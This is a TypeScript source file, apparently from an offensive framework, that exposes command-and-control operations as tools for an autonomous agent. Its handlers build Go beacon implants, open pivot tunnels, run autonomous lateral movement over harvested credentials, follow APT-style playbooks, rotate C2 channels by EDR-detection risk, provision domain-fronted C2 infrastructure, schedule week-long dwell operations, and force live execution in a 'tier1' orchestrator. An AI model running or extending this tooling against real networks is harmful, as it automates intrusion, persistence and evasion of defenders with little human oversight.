import * as crypto from "node:crypto"
import type { AgentToolContext, ToolRunResult } from "../agent_tools.ts"
import { hostFromTarget } from "../agent_tools.ts"
import { result, agentToolBridge } from "./_shared.ts"

export const c2_bridge = {
  pivot_tunnel: async (ctx, params) => {
    const { createPortForwarder } = await import("../pivot_tunnel.ts")
    const method = String(params.method ?? "socks5")
    const type = method === "chisel" ? "chisel" : method === "ssh" ? "port_forward" : "socks5"
    const r = createPortForwarder(
      {
        type,
        localPort: Number(params.lport ?? 1080),
        remoteHost: String(params.rhost ?? "127.0.0.1"),
        remotePort: Number(params.rport ?? 22),
      },
      ctx.live,
    )
    return result("pivot_tunnel", "createPortForwarder", ctx, r)
  },
  implant_build: async (ctx, params) => {
    const { NativeImplantGenerator } = await import("../implant_gen.ts")
    const gen = new NativeImplantGenerator()
    const mailbox = String(params.mailbox ?? process.env.OURMINE_C2_MAILBOX ?? "http://127.0.0.1:8080/mailbox")
    const keyHex = String(params.key ?? crypto.randomBytes(32).toString("hex"))
    const session = String(params.session ?? "sess_" + Date.now())
    const source = gen.generateGo(mailbox, keyHex, session)
    if (!ctx.live) {
      return result("implant_build", "NativeImplantGenerator.generateGo", ctx, { sourceLength: source.length, built: false, dryRun: true })
    }
    const outDir = String(params.outDir ?? "/tmp/ourmine_beacon_build")
    const built = await gen.buildGo(source, outDir, { goos: String(params.goos ?? "linux"), goarch: String(params.goarch ?? "amd64") })
    return result("implant_build", "NativeImplantGenerator.buildGo", ctx, built, built.status === "built")
  },
  autonomous_pivot: async (ctx, params) => {
    const { runAutonomousPivot } = await import("../autonomous_pivot.ts")
    const { CredentialGraph } = await import("../credential_graph.ts")
    const credGraph = CredentialGraph.load()
    if (process.env.OURMINE_LAB_AUTONOMOUS === "1") process.env.OURMINE_AUTONOMOUS_PIVOT = "1"
    const r = await runAutonomousPivot({
      graph: ctx.graph,
      credGraph,
      live: ctx.live,
      extraHosts: (params.extra_hosts as string[]) ?? [],
      objective: (params.objective as import("../autonomous_pivot.ts").PivotObjective) ?? "recon_only",
    })
    credGraph.save()
    return result("autonomous_pivot", "runAutonomousPivot", ctx, r, r.hostsGained.length > 0 || !ctx.live)
  },
  apt_playbook: async (ctx, params) => {
    const { loadPlaybook, nextPlaybookNode, markNodeDone } = await import("../apt_playbook.ts")
    const profileId = String(params.profile_id ?? "scattered_spider")
    const playbook = loadPlaybook(profileId)
    if (!playbook) return result("apt_playbook", "loadPlaybook", ctx, { error: "unknown profile" }, false)
    const { CredentialGraph } = await import("../credential_graph.ts")
    const credGraph = CredentialGraph.load()
    const node = nextPlaybookNode(playbook, {
      currentPhase: String(params.phase ?? "recon") as import("../pentestgpt_agent.ts").Phase,
      graph: ctx.graph,
      credCount: credGraph.listCredentials().length,
      availableTools: new Set(["recon", "nmap_scan", "web_exploit", "lateral_move"]),
    })
    if (node && params.execute === true) {
      const toolResult = await import("../agent_tools.ts").then((m) => m.executeAgentTool(ctx, node.tool, node.params ?? {}))
      markNodeDone(playbook, node.id, toolResult.success, toolResult.output.slice(0, 200))
    }
    return result("apt_playbook", "nextPlaybookNode", ctx, { profileId, next: node, playbook })
  },
  c2_autonomous: async (ctx, params) => {
    const { LegitC2Server } = await import("../c2_platform.ts")
    const { runAutonomousC2Pump } = await import("../c2_autonomous.ts")
    const server = new LegitC2Server({ checkpointPath: String(params.checkpoint ?? ".ourmine/c2/checkpoint.jsonl") })
    const scopeHosts = [hostFromTarget(ctx.target), ...Object.keys((ctx.graph.toJSON() as { assets?: Record<string, unknown> }).assets ?? {})]
    const r = await runAutonomousC2Pump({ server, graph: ctx.graph, scopeHosts, maxTasksPerPump: Number(params.max_tasks ?? 5) })
    return result("c2_autonomous", "runAutonomousC2Pump", ctx, r)
  },
  c2_rotation: async (ctx, params) => {
    const { selectC2Channel } = await import("../c2_rotation.ts")
    const { InMemoryTransport } = await import("../c2_platform.ts")
    const channels = [
      { name: "in-memory", transport: new InMemoryTransport(), priority: 10, edrRisk: "low" as const },
      { name: "http-webhook", transport: new InMemoryTransport(), priority: 5, edrRisk: "medium" as const },
    ]
    const r = await selectC2Channel(channels, { live: ctx.live, previousChannel: params.previous as string | undefined })
    return result("c2_rotation", "selectC2Channel", ctx, r)
  },
  campaign_loop: async (ctx, params) => {
    const { runCampaignLoop } = await import("../campaign_loop.ts")
    const { CredentialGraph } = await import("../credential_graph.ts")
    const { EngagementMemory } = await import("../engagement_memory.ts")
    const credGraph = CredentialGraph.load()
    const mem = EngagementMemory.loadForTarget(ctx.target)
    if (process.env.OURMINE_TIER1 === "1") process.env.OURMINE_AUTONOMOUS_PIVOT = "1"
    const r = await runCampaignLoop({
      graph: ctx.graph,
      credGraph,
      target: hostFromTarget(ctx.target),
      live: ctx.live,
      engagementMem: mem,
      objective: params.objective ? { type: String(params.objective) as import("../autonomous_pivot.ts").PivotObjective, maxHosts: 10, maxSteps: 15 } : undefined,
    })
    return result("campaign_loop", "runCampaignLoop", ctx, r, r.objectiveMet || r.phases.some((p) => p.success))
  },
  c2_infra: async (ctx, params) => {
    const { provisionC2Infrastructure } = await import("../c2_infra.ts")
    const host = hostFromTarget(ctx.target)
    const config = {
      c2Ip: String(params.c2_ip ?? host),
      c2Port: Number(params.c2_port ?? 443),
      domain: String(params.domain ?? host),
      cdnProvider: String(params.cdn_provider ?? "cloudflare") as "cloudflare" | "cloudfront" | "none",
      protocol: String(params.protocol ?? "https") as "https" | "http" | "dns",
      listeningPort: Number(params.listening_port ?? 443),
      sslEnabled: params.ssl_enabled !== false,
    }
    const r = await provisionC2Infrastructure(config, {
      dryRun: !ctx.live,
      includeSsl: params.include_ssl !== false,
      includeFirewall: params.include_firewall !== false,
      includeDomainFront: params.include_domain_front !== false,
    })
    return result("c2_infra", "provisionC2Infrastructure", ctx, r, !!r.terraformConfig || !ctx.live)
  },
  c2_dwell_ops: async (ctx, params) => {
    const { runC2DwellOps } = await import("../c2_dwell_ops.ts")
    const scopeHosts = [hostFromTarget(ctx.target), ...Object.keys((ctx.graph.toJSON() as { assets?: Record<string, unknown> }).assets ?? {})]
    const r = await runC2DwellOps({ graph: ctx.graph, scopeHosts, live: ctx.live, dwellHours: Number(params.dwell_hours ?? 168) })
    return result("c2_dwell_ops", "runC2DwellOps", ctx, r, !!r.c2Pump || !ctx.live)
  },
  tier1_orchestrator: async (ctx, params) => {
    const { runTier1Orchestrator } = await import("../tier1_orchestrator.ts")
    const { CredentialGraph } = await import("../credential_graph.ts")
    if (!ctx.live && process.env.OURMINE_TIER1 !== "1") {
      return result("tier1_orchestrator", "runTier1Orchestrator", ctx, { error: "live execution required" }, false)
    }
    process.env.OURMINE_TIER1 = "1"
    const r = await runTier1Orchestrator({
      target: ctx.target,
      graph: ctx.graph,
      credGraph: CredentialGraph.load(),
      live: true,
      profileId: params.profile_id as string | undefined,
    })
    return result("tier1_orchestrator", "runTier1Orchestrator", ctx, r, r.live)
  },
  segment_tunnel: async (ctx) => {
    const { orchestrateSegmentTunnels } = await import("../segment_tunnel_orchestrator.ts")
    const r = await orchestrateSegmentTunnels(ctx.graph, { live: ctx.live })
    return result("segment_tunnel", "orchestrateSegmentTunnels", ctx, r, r.tunnels.some((t) => t.live))
  },
  c2_dwell_scheduler: async (ctx, params) => {
    const { runDwellSchedule } = await import("../c2_dwell_scheduler.ts")
    const scopeHosts = [hostFromTarget(ctx.target), ...Object.keys((ctx.graph.toJSON() as { assets?: Record<string, unknown> }).assets ?? {})]
    const r = await runDwellSchedule({ graph: ctx.graph, scopeHosts, live: ctx.live, dwellHours: Number(params.dwell_hours ?? 168), maxTicks: Number(params.max_ticks ?? 3) })
    return result("c2_dwell_scheduler", "runDwellSchedule", ctx, r, r.ticks.length > 0 || !ctx.live)
  },
} as const
